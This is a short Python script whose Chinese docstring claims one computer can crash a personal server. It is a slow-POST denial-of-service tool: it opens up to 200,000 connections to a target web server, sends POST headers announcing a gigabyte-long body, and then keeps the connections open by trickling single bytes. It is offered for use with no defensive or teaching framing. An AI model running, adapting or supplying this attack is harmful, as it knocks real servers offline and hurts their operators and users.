"""
一台电脑便可以使一台个人服务器崩溃！
如果想要降低占用可以删除print
"""

import socket
import time
import threading

MAX_CONN = 200000
PORT = 80
HOST = "www.example.com"
PAGE = "/"
buf = ("POST %s HTTP/1.1\n"
       "Host: %s\n"
       "Content-Length: 1000000000\n"
       "Cookie: dklkt_dos_test\n"
       "\n" % (PAGE, HOST))
buf = buf.encode()
socks = []


def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf)
            print("[+] Send buf OK!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("[-] Could not connect to server or send error:%s" % ex)
            time.sleep(0)


def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f")
                print("[+] send OK! %s" % s)
            except Exception as ex:
                print("[-] send Exception:%s\n" % ex)
                socks.remove(s)
                s.close()
        time.sleep(0)


conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())
conn_th.start()
send_th.start()
